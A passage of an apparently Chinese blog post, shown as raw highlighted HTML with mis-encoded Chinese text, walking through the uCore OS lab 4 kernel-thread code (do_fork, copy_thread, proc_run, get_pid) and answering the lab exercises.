class="hljs-title">mm</span>;</span>           <span class="hljs-comment">// å½“å‰è¿›ç¨‹æ‰€ç®¡ç†çš„è™šæ‹Ÿå†…å­˜é¡µï¼ŒåŒ…æ‹¬å…¶æ‰€å±çš„é¡µç›®å½•é¡¹PDT</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">context</span> <span class="hljs-title">context</span>;</span>         <span class="hljs-comment">// ä¿å­˜çš„ä¸Šä¸‹æ–‡</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">trapframe</span> *<span class="hljs-title">tf</span>;</span>           <span class="hljs-comment">// ä¸­æ–­æ‰€ä¿å­˜çš„ä¸Šä¸‹æ–‡</span><br>    <span class="hljs-keyword">uintptr_t</span> cr3;                  <span class="hljs-comment">// é¡µç›®å½•è¡¨çš„åœ°å€</span><br>    <span class="hljs-keyword">uint32_t</span> flags;                 <span class="hljs-comment">// å½“å‰è¿›ç¨‹çš„ç›¸å…³æ ‡å¿—</span><br>    <span class="hljs-keyword">char</span> name[PROC_NAME_LEN + <span class="hljs-number">1</span>];   <span class="hljs-comment">// è¿›ç¨‹åç§°ï¼ˆå¯æ‰§è¡Œæ–‡ä»¶åï¼‰</span><br>    <span class="hljs-keyword">list_entry_t</span> list_link;         <span class="hljs-comment">// ç”¨äºè¿æ¥list</span><br>    <span class="hljs-keyword">list_entry_t</span> hash_link;         <span class="hljs-comment">// ç”¨äºè¿æ¥hash list</span><br>&#125;;<br></code></pre></div></td></tr></table></figure><h3 id="2-æµç¨‹"><a href="#2-æµç¨‹" class="headerlink" title="2.æµç¨‹"></a>2.æµç¨‹</h3><ul><li>é¦–å…ˆè‚¯å®šæ˜¯<code>proc_init()</code>:</li></ul><p><img src="../../image/ucore/image-20211224212029857.png" alt="image-20211224212029857"></p><ul><li><p>é¦–å…ˆåˆå§‹åŒ–ä¸€ä¸‹<code>proc_list</code>å’Œ<code>hash_list</code>, ç„¶åè°ƒç”¨<code>alloc_proc()</code>æ¥é€šè¿‡<code>kmalloc()</code>è·å–ä¸€ä¸ªproc_structçš„ç©ºé—´, ä»¥åŠç•¥å¾®åˆå§‹åŒ–ä¸€ä¸‹ç¬¬0ä¸ªå†…æ ¸çº¿ç¨‹idleproc(æŒ‡æŠŠçŠ¶æ€è®¾æˆPROC_UNINIT, pidè®¾æˆ-1ç­‰ç­‰)</p></li><li><p>æ¥ç€çœŸæ­£åˆå§‹åŒ–ä¸€ä¸‹å„ä¸ªå­—æ®µçš„å€¼, å…¶ä¸­kstackç›´æ¥è®¾ç½®æˆå†…æ ¸æ ˆbootstack(å‰é¢ç»™è¿‡å‡ºå¤„, å†…æ ¸æ ˆæ€»å…±8KB), å¼„æˆcurrent</p></li><li><p>æ¥ç€è°ƒç”¨kern_threadæ¥åˆ›å»ºç¬¬1ä¸ªå†…æ ¸çº¿ç¨‹</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">kernel_thread(<span class="hljs-keyword">int</span> (*fn)(<span class="hljs-keyword">void</span> *), <span class="hljs-keyword">void</span> *arg, <span class="hljs-keyword">uint32_t</span> clone_flags)<br>&#123;<span class="hljs-comment">//ä¸‰ä¸ªå‚æ•°ä¸ºinit_main, &quot;Hello World!&quot;, 0</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">trapframe</span> <span class="hljs-title">tf</span>;</span><br>    <span class="hljs-built_in">memset</span>(&amp;tf, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(struct trapframe));<br>    tf.tf_cs = KERNEL_CS;<br>    tf.tf_ds = tf_struct.tf_es = tf_struct.tf_ss = KERNEL_DS;<br>    tf.tf_regs.reg_ebx = (<span class="hljs-keyword">uint32_t</span>)fn;<br>    tf.tf_regs.reg_edx = (<span class="hljs-keyword">uint32_t</span>)arg;<br>    tf.tf_eip = (<span class="hljs-keyword">uint32_t</span>)kernel_thread_entry;<br>    <span class="hljs-keyword">return</span> do_fork(clone_flags | CLONE_VM, <span class="hljs-number">0</span>, &amp;tf);<br>&#125;<br></code></pre></div></td></tr></table></figure><ul><li>ç”¨å±€éƒ¨å˜é‡åœ¨æ ˆä¸Šä¿å­˜trapframe, å…¨éƒ¨è®¾ç½®æˆå†…æ ¸çš„æ®µå’Œæ ˆ</li><li>æ³¨æ„eip, è®¾ç½®æˆäº†å››è¡Œæ±‡ç¼–çš„å…¥å£åŠé€€å‡ºä»£ç , æ•ˆæœç›¸å½“äºcè¯­è¨€mainå‡½æ•°ä¹‹å‰çš„å‡†å¤‡å‡½æ•°</li><li>éšåè°ƒç”¨do_fork()è¿›è¡Œçº¿ç¨‹çš„åˆ›å»º(ä¸»è¦æ ¹æ®trapframe)</li></ul></li><li><p>kern_threadä¸­çš„do_fork()</p><ul><li><p>åˆ†é…å¹¶åˆå§‹åŒ–è¿›ç¨‹æ§åˆ¶å—ï¼ˆalloc_procå‡½æ•°ï¼‰</p></li><li><p>åˆ†é…å¹¶åˆå§‹åŒ–å†…æ ¸æ ˆï¼ˆsetup_stackå‡½æ•°ï¼‰,è°ƒç”¨alloc_pages()åˆ†é…2ä¸ª(å³<code>KSTACKPAGE</code>)page</p></li><li><p>æ ¹æ®clone_flagæ ‡å¿—å¤åˆ¶æˆ–å…±äº«è¿›ç¨‹å†…å­˜ç®¡ç†ç»“æ„ï¼ˆcopy_mmå‡½æ•°ï¼‰</p></li><li><p>è®¾ç½®è¿›ç¨‹åœ¨å†…æ ¸ï¼ˆå°†æ¥ä¹ŸåŒ…æ‹¬ç”¨æˆ·æ€ï¼‰æ­£å¸¸è¿è¡Œå’Œè°ƒåº¦æ‰€éœ€çš„trapframeå’Œæ‰§è¡Œcontext (<strong>copy_thread</strong>å‡½æ•°)</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span></span><br><span class="hljs-function"><span class="hljs-title">copy_thread</span><span class="hljs-params">(struct proc_struct *proc, <span class="hljs-keyword">uintptr_t</span> esp, struct trapframe *tf)</span> </span>&#123;<br>    <span class="hljs-comment">//åœ¨å†…æ ¸å †æ ˆçš„é¡¶éƒ¨è®¾ç½®ä¸­æ–­å¸§å¤§å°çš„ä¸€å—æ ˆç©ºé—´</span><br>    <span class="hljs-comment">//è¿™ä¸ªå‡ä¸€å°±å¾ˆçµæ€§, å› ä¸ºtfåœ¨æ ˆä¸Šå æ®äº†ç©ºé—´, æ‰€ä»¥æ ˆæŒ‡é’ˆä¸‹ç§»</span><br>    proc-&gt;tf = (struct trapframe *)(proc-&gt;kstack + KSTACKSIZE) - <span class="hljs-number">1</span>;<br>    *(proc-&gt;tf) = *tf; <span class="hljs-comment">//æ‹·è´åœ¨kernel_threadå‡½æ•°å»ºç«‹çš„ä¸´æ—¶ä¸­æ–­å¸§çš„åˆå§‹å€¼</span><br>    proc-&gt;tf-&gt;tf_regs.reg_eax = <span class="hljs-number">0</span>;<span class="hljs-comment">//è®¾ç½®å­è¿›ç¨‹/çº¿ç¨‹æ‰§è¡Œå®Œdo_forkåçš„è¿”å›å€¼</span><br>    proc-&gt;tf-&gt;tf_esp = esp; <span class="hljs-comment">//è®¾ç½®ä¸­æ–­å¸§ä¸­çš„æ ˆæŒ‡é’ˆesp,å› ä¸ºæˆ‘ä»¬å¤åˆ¶äº†å†…å­˜,ç›´æ¥ä½¿ç”¨çˆ¶è¿›ç¨‹espå³å¯</span><br>    proc-&gt;tf-&gt;tf_eflags |= FL_IF; <span class="hljs-comment">//ä½¿èƒ½ä¸­æ–­</span><br>    <br>    proc-&gt;context.eip = (<span class="hljs-keyword">uintptr_t</span>)forkret;<span class="hljs-comment">//ç”±è°ƒåº¦å™¨ä¸­çš„switch_toæŠŠè¿™ä¸ªpushåˆ°æ ˆä¸Šå†retæ¥æ¢å¤æ‰§è¡Œ</span><br>    <span class="hljs-comment">//è¿™ä¸ªproc-&gt;tfå’Œespæœ‰ä»€ä¹ˆå…³ç³»? å…¶å®forkæ‰§è¡Œå®Œåå­è¿›ç¨‹ä»ç„¶å¤„äºå†…æ ¸ä¸­ä¸­æ–­å¤„ç†ä¾‹ç¨‹çš„çŠ¶æ€(ç”±contextå†³å®š)</span><br>    <span class="hljs-comment">//å¦‚æœçˆ¶è¿›ç¨‹åˆšå¥½æœ‰ä¸€ä¸ªwait, é‚£ä¹ˆå°±ä¼šè°ƒåº¦å­è¿›ç¨‹æ‰§è¡Œ, ä¹Ÿå°±æ˜¯æ‰§è¡Œfork_retä»ä¸­æ–­é€€å‡ºä»¥ç»§ç»­æ‰§è¡Œç”¨æˆ·è¿›ç¨‹</span><br>    proc-&gt;context.esp = (<span class="hljs-keyword">uintptr_t</span>)(proc-&gt;tf);<br>&#125;<br></code></pre></div></td></tr></table></figure></li><li><p>æŠŠè®¾ç½®å¥½çš„è¿›ç¨‹æ§åˆ¶å—æ”¾å…¥hash_listå’Œproc_listä¸¤ä¸ªå…¨å±€è¿›ç¨‹é“¾è¡¨ä¸­</p></li><li><p>è‡ªæ­¤ï¼Œè¿›ç¨‹å·²ç»å‡†å¤‡å¥½æ‰§è¡Œäº†ï¼ŒæŠŠè¿›ç¨‹çŠ¶æ€è®¾ç½®ä¸ºâ€œå°±ç»ªâ€æ€ï¼›</p></li><li><p>è®¾ç½®è¿”å›ç ä¸ºå­è¿›ç¨‹çš„idå·ã€‚</p></li><li><p>æ­¤æ—¶å¯çŸ¥init_procçš„ä¸­æ–­å¸§å¦‚ä¸‹æ‰€ç¤º, æ§åˆ¶å—è®°å½•ç€è¯¥çº¿ç¨‹çš„ä¸€åˆ‡å¿…è¦ä¿¡æ¯, åœ¨å†…æ ¸æ€è®¾ç½®å¥½äº†å†…æ ¸æ ˆä»¥åŠå…¶ä¸Šçš„trapframe, å¦‚æœæ˜¯ç”¨æˆ·ç¨‹åº(åº”è¯¥åœ¨ä¸‹ä¸€ä¸ªå®éªŒä¸­)åªéœ€æ‰§è¡Œä¸€ä¸‹ä¸­æ–­è¿”å›çš„æµç¨‹å³å¯</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">//æ‰€åœ¨åœ°å€ä½ç½®</span><br>initproc-&gt;tf= (proc-&gt;kstack+KSTACKSIZE) â€“ <span class="hljs-keyword">sizeof</span> (struct trapframe);<br><span class="hljs-comment">//å…·ä½“å†…å®¹</span><br>initproc-&gt;tf.tf_cs = KERNEL_CS;<br>initproc-&gt;tf.tf_ds = initproc-&gt;tf.tf_es = initproc-&gt;tf.tf_ss = KERNEL_DS;<br>initproc-&gt;tf.tf_regs.reg_ebx = (<span class="hljs-keyword">uint32_t</span>)init_main;<br>initproc-&gt;tf.tf_regs.reg_edx = (<span class="hljs-keyword">uint32_t</span>) ADDRESS of <span class="hljs-string">&quot;Helloworld!!&quot;</span>;<br>initproc-&gt;tf.tf_eip = (<span class="hljs-keyword">uint32_t</span>)kernel_thread_entry;<br>initproc-&gt;tf.tf_regs.reg_eax = <span class="hljs-number">0</span>;<br>initproc-&gt;tf.tf_esp = esp;<br>initproc-&gt;tf.tf_eflags |= FL_IF;<br></code></pre></div></td></tr></table></figure></li></ul></li><li><p>ç„¶åä»kern_init()ä¸­æ°¸çœŸå¾ªç¯çš„cpu_idleè¿›å…¥è°ƒåº¦å‡½æ•°<strong>schedule</strong>(), æ˜¯å¾ˆç®€å•çš„FIFO, æ³¨æ„è¦ä¿è¯è°ƒåº¦æ“ä½œçš„atomicity, å³å±è”½ä¸­æ–­, IFç½®é›¶</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">// cpu_idle - at the end of kern_init, the first kernel thread idleproc will do below works</span><br>  <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">cpu_idle</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span> </span>&#123;<br>      <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;<br>          <span class="hljs-keyword">if</span> (current-&gt;need_resched) &#123;<br>              schedule();<br>          &#125;&#125;&#125;<br></code></pre></div></td></tr></table></figure><p><img src="../../image/ucore/image-20211224232536016.png" alt="image-20211224232536016"></p><ol><li>è®¾ç½®å½“å‰å†…æ ¸çº¿ç¨‹current-&gt;need_reschedä¸º0ï¼› <strong>(?</strong> </li><li>åœ¨proc_listé˜Ÿåˆ—ä¸­æŸ¥æ‰¾ä¸‹ä¸€ä¸ªå¤„äºâ€œå°±ç»ªâ€æ€çš„çº¿ç¨‹æˆ–è¿›ç¨‹<code>next</code>ï¼› </li><li>æ‰¾åˆ°è¿™æ ·çš„è¿›ç¨‹åï¼Œå°±è°ƒç”¨proc_runå‡½æ•°ï¼Œä¿å­˜å½“å‰è¿›ç¨‹currentçš„æ‰§è¡Œç°åœºï¼ˆè¿›ç¨‹ä¸Šä¸‹æ–‡ï¼‰ï¼Œæ¢å¤æ–°è¿›ç¨‹çš„æ‰§è¡Œç°åœºï¼Œå®Œæˆè¿›ç¨‹åˆ‡æ¢ã€‚</li></ol></li><li><p>proc_runæ¯”è¾ƒé‡è¦:</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">proc_run</span><span class="hljs-params">(struct proc_struct *proc)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (proc != current) &#123;<br>        <span class="hljs-keyword">bool</span> intr_flag;<br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proc_struct</span> *<span class="hljs-title">prev</span> =</span> current, *next = proc;<br>        local_intr_save(intr_flag); <br>        &#123;<br>            current = proc;<br>            load_esp0(next-&gt;kstack + KSTACKSIZE);  <span class="hljs-comment">//åœ¨TSSä¸­çš„ring0æ ˆé¡¶æŒ‡é’ˆ</span><br>            lcr3(next-&gt;cr3);<span class="hljs-comment">//è¿™å®é™…ä¸Šæ˜¯å®Œæˆè¿›ç¨‹é—´çš„é¡µè¡¨åˆ‡æ¢ï¼›</span><br>            switch_to(&amp;(prev-&gt;context), &amp;(next-&gt;context));<br>        &#125;<br>        local_intr_restore(intr_flag);<br>&#125;&#125;<br></code></pre></div></td></tr></table></figure><ul><li>switch()æ¯”è¾ƒç‰¹åˆ«,å› ä¸ºä¸¤ä¸ªå‚æ•°éƒ½æ˜¯åœ¨å†…å­˜ä¸­,ç„¶è€Œå¹¶ä¸èƒ½ä»å†…å­˜ç›´æ¥è¯»å–åˆ°å†…å­˜, åªèƒ½é€šè¿‡ä¸€æ®µæ±‡ç¼–æ¥æŠŠprevçš„contexté€šè¿‡%eaxåšåª’ä»‹å­˜å…¥ç›¸åº”å¯„å­˜å™¨ä¸­, è¿™æ ·contextå°±å»ºç«‹å®Œæˆäº†, æ³¨æ„åˆ°eipè¢«è®¾ç½®æˆforkrets, å°±æ˜¯åœ¨trap.Sé‡Œçš„ä¸€æ®µæ±‡ç¼–, è€Œä¸”é‡ç”¨äº†ä»¥å‰çš„ä»£ç </li><li><strong>è°ƒåº¦å®Œæˆåå…ˆæ‰§è¡Œforkret, ä»æ ˆä¸Šå¼¹å‡ºentryçš„åœ°å€(å’Œebpç­‰ä¸€èµ·åŒ…å«åœ¨tfä¸­), ç„¶åå†æ‰§è¡Œç”¨æˆ·çš„ä¸»å‡½æ•°fn(åœ¨è¿™é‡Œæ˜¯initmain)</strong> </li></ul></li><li><p>éšå<strong>è¿›ç¨‹æ‰§è¡Œå®Œæ¯•å</strong>å°±è¿”å›åˆ°kernel_tread_entryå‡½æ•°ï¼Œå¹¶è¿›ä¸€æ­¥è°ƒç”¨<strong>do_exit</strong>æ‰§è¡Œé€€å‡ºæ“ä½œäº†ã€‚æœ¬æ¥do_exitåº”è¯¥å®Œæˆä¸€äº›èµ„æºå›æ”¶å·¥ä½œç­‰ï¼Œä½†è¿™äº›ä¸æ˜¯å®éªŒå››æ¶‰åŠçš„ï¼Œè€Œæ˜¯ç”±åç»­çš„å®éªŒæ¥å®Œæˆã€‚</p></li></ul><h2 id="ç»ƒä¹ -1"><a href="#ç»ƒä¹ -1" class="headerlink" title="ç»ƒä¹ "></a>ç»ƒä¹ </h2><h3 id="ç»ƒä¹ 1-1"><a href="#ç»ƒä¹ 1-1" class="headerlink" title="ç»ƒä¹ 1"></a>ç»ƒä¹ 1</h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">// alloc_proc - alloc a proc_struct and init all fields of proc_struct</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> struct proc_struct *</span><br><span class="hljs-function"><span class="hljs-title">alloc_proc</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proc_struct</span> *<span class="hljs-title">proc</span> =</span> kmalloc(<span class="hljs-keyword">sizeof</span>(struct proc_struct));<br>    <span class="hljs-keyword">if</span> (proc != <span class="hljs-literal">NULL</span>)<br>    &#123;<br>        <span class="hljs-built_in">memset</span>(proc, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(struct proc_struct));<br>        proc-&gt;state = PROC_UNINIT;<br>        proc-&gt;pid = <span class="hljs-number">-1</span>;<br>        proc-&gt;cr3 = boot_cr3;<br>    &#125;<br>    <span class="hljs-keyword">return</span> proc;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>è¯·è¯´æ˜proc_structä¸­<code>struct context context</code>å’Œ<code>struct trapframe *tf</code>æˆå‘˜å˜é‡å«ä¹‰å’Œåœ¨æœ¬å®éªŒä¸­çš„ä½œç”¨æ˜¯å•¥ï¼Ÿ</p><ul><li>contextçš„å«ä¹‰å¾ˆç®€å•, å°±æ˜¯è¯¥çº¿ç¨‹çš„ä¸Šä¸‹æ–‡å³å¿…è¦çš„æ§åˆ¶æµä¿¡æ¯, ä½œç”¨æ˜¯åœ¨proc_run()å‡½æ•°ä¸­è°ƒç”¨çš„switch(æ±‡ç¼–label)ä¿å­˜å½“å‰æ‰§è¡Œçš„çº¿ç¨‹, ç„¶åæ¢å¤nextçº¿ç¨‹çš„context</li><li>tfä¸€å¼€å§‹åœ¨kern_threadä¸­ä½œä¸ºå±€éƒ¨å˜é‡å­˜åœ¨æ ˆä¸Š, è®¾ç½®å¥½ä»ä¸­æ–­è¿”å›(é€šè¿‡iret)æ—¶çš„æ§åˆ¶æµåè°ƒç”¨do_fork(), åœ¨do_forkä¸­çš„copy_threadå¤åˆ¶tfåˆ°æ–°çº¿ç¨‹, è‡³æ­¤å®Œæˆä»»åŠ¡</li></ul><h3 id="ç»ƒä¹ 2-1"><a href="#ç»ƒä¹ 2-1" class="headerlink" title="ç»ƒä¹ 2"></a>ç»ƒä¹ 2</h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/* do_fork -     parent process for a new child process</span><br><span class="hljs-comment"> * @clone_flags: used to guide how to clone the child process</span><br><span class="hljs-comment"> * @stack:       the parent&#x27;s user stack pointer. if stack==0, It means to fork a kernel thread.</span><br><span class="hljs-comment"> * @tf:          the trapframe info, which will be copied to child process&#x27;s proc-&gt;tf</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">do_fork</span><span class="hljs-params">(<span class="hljs-keyword">uint32_t</span> clone_flags, <span class="hljs-keyword">uintptr_t</span> <span class="hljs-built_in">stack</span>, struct trapframe *tf)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> ret = -E_NO_FREE_PROC;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proc_struct</span> *<span class="hljs-title">proc</span>;</span><br>    <span class="hljs-keyword">if</span> (nr_process &gt;= MAX_PROCESS)<br>    &#123;<br>        <span class="hljs-keyword">goto</span> fork_out;<br>    &#125;<br>    ret = -E_NO_MEM;<br>    <span class="hljs-comment">//    1. call alloc_proc to allocate a proc_struct</span><br>    <span class="hljs-comment">//    2. call setup_kstack to allocate a kernel stack for child process</span><br>    <span class="hljs-comment">//    3. call copy_mm to dup OR share mm according clone_flag</span><br>    <span class="hljs-comment">//    4. call copy_thread to setup tf &amp; context in proc_struct</span><br>    <span class="hljs-comment">//    5. insert proc_struct into hash_list &amp;&amp; proc_list</span><br>    <span class="hljs-comment">//    6. call wakeup_proc to make the new child process RUNNABLE</span><br>    <span class="hljs-comment">//    7. set ret vaule using child proc&#x27;s pid</span><br>    <span class="hljs-keyword">if</span> ((proc = alloc_proc()) == <span class="hljs-literal">NULL</span>)<br>    &#123;<br>        cprintf(<span class="hljs-string">&quot;alloc_proc() failed!&quot;</span>);<br>        <span class="hljs-keyword">goto</span> fork_out;<br>    &#125;<br>    proc-&gt;parent = current;<br>    <span class="hljs-keyword">if</span> ((ret = setup_kstack(proc)) != <span class="hljs-number">0</span>)<br>    &#123; <span class="hljs-comment">//call the alloc_pages to alloc kstack space</span><br>        cprintf(<span class="hljs-string">&quot;set_kstack() failed!&quot;</span>);<br>        <span class="hljs-keyword">goto</span> bad_fork_cleanup_proc;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (copy_mm(clone_flags, proc) != <span class="hljs-number">0</span>)<br>    &#123;<br>cprintf(<span class="hljs-string">&quot;copy_mm() failed!&quot;</span>);<br>        <span class="hljs-keyword">goto</span> bad_fork_cleanup_kstack;<br>    &#125;<br>    copy_thread(proc, <span class="hljs-built_in">stack</span>, tf);<br>    <span class="hljs-keyword">bool</span> intr_flag;<br>    local_intr_save(intr_flag);<br>    &#123;<span class="hljs-comment">//åŸæ¥è¿™é‡Œè¿˜è¦åŠ ä¸Šå±è”½ä¸­æ–­, åº”è¯¥æ˜¯æ“ä½œå½“å‰proc_structéœ€è¦ä¸€èµ·å®Œæˆ</span><br>     <span class="hljs-comment">//é˜²æ­¢æŸä¸ªä¸­æ–­æœåŠ¡ä¾‹ç¨‹ç”¨åˆ°çš„æ—¶å€™å‡ºç°é”™è¯¯</span><br>        proc-&gt;pid = get_pid();<br>        hash_proc(proc);<br>        list_add(&amp;proc_list, &amp;(proc-&gt;list_link));<br>        nr_process++;<br>    &#125;<br>    local_intr_restore(intr_flag);<br>    wakeup_proc(proc);<br>    ret = proc-&gt;pid;<br>fork_out:<br>    <span class="hljs-keyword">return</span> ret;<br><br>bad_fork_cleanup_kstack:<br>    put_kstack(proc);<br>bad_fork_cleanup_proc:<br>    kfree(proc);<br>    <span class="hljs-keyword">goto</span> fork_out;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>è¯·è¯´æ˜ucoreæ˜¯å¦åšåˆ°ç»™æ¯ä¸ªæ–°forkçš„çº¿ç¨‹ä¸€ä¸ªå”¯ä¸€çš„idï¼Ÿè¯·è¯´æ˜ä½ çš„åˆ†æå’Œç†ç”±ã€‚</p><p>uCoreä¸­ï¼Œæ¯ä¸ªæ–°forkçš„çº¿ç¨‹éƒ½å­˜åœ¨å”¯ä¸€çš„ä¸€ä¸ªIDï¼Œç†ç”±å¦‚ä¸‹ï¼š</p><ul><li><p>è¿™ä¸€æ®µä»£ç ç›¸å½“äºæ‰¾å‡ºäº†ä¸€ä¸ªåˆå§‹ä¸º(MAX_PID,MAX_PID), ä¸æ»¡è¶³æ¡ä»¶æ—¶å¾€pidå¤§çš„æ–¹å‘æŸ¥æ‰¾ç©ºé—²åŒºé—´(last_safe, next_safe),<br>åªè¦<code>++last&lt;next</code>åˆ™è‡ªå¢åçš„lastå³ä¸ºå¯åˆ†é…çš„pid, å…·ä½“æµç¨‹å†™è¿›ä»£ç æ³¨é‡Šä¸­</p></li><li><p>æ‰€ä»¥è¯´å°±æ˜¯é€šè¿‡ç»´æŠ¤ä¸€ä¸ªå¯ç”¨PIDçš„åŒºé—´, å¯ä»¥æé«˜åˆ†é…pidçš„æ•ˆç‡</p></li><li><p><code>get_pid</code>ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">// get_pid - alloc a unique pid for process</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span></span><br><span class="hljs-function"><span class="hljs-title">get_pid</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">static_assert</span>(MAX_PID &gt; MAX_PROCESS);<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proc_struct</span> *<span class="hljs-title">proc</span>;</span><br>    <span class="hljs-keyword">list_entry_t</span> *<span class="hljs-built_in">list</span> = &amp;proc_list, *le;<br>    <span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> next_safe = MAX_PID, last_pid = MAX_PID;<br>    <span class="hljs-keyword">if</span> (++last_pid &gt;= MAX_PID)<br>    &#123;<span class="hljs-comment">//lastè‡ªå¢å&gt;=MAX_PID, ä»1é‡æ–°å¼€å§‹, nextè®¾ä¸ºMAX_PID, å¾…åç»­ç¼©å°èŒƒå›´</span><br>        last_pid = <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">goto</span> inside;<br>    